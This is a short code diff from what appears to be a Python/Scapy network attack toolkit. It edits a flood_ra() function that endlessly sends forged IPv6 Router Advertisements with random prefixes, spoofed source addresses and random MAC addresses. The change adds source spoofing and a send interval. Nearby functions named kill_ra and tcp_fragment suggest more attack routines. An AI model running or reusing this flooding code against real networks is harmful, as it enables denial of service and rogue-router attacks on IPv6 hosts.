@@ -89,8 +89,8 @@ def kill_ra():
     return()
 
 def flood_ra():
-    pkt = Ether()/IPv6()/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix= RandIP6("2001:CAFE:*::"),prefixlen=64)/ICMPv6NDOptSrcLLAddr(lladdr = randmacaddr() )
-    sendp(pkt,loop=1)
+    pkt = Ether()/IPv6(src=RandIP6("2001:DEAD:1:1::*"))/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix= RandIP6("2001:CAFE:*::"),prefixlen=64)/ICMPv6NDOptSrcLLAddr(lladdr = randmacaddr() )
+    sendp(pkt,loop=1, inter=3)
 
 
 def tcp_fragment():
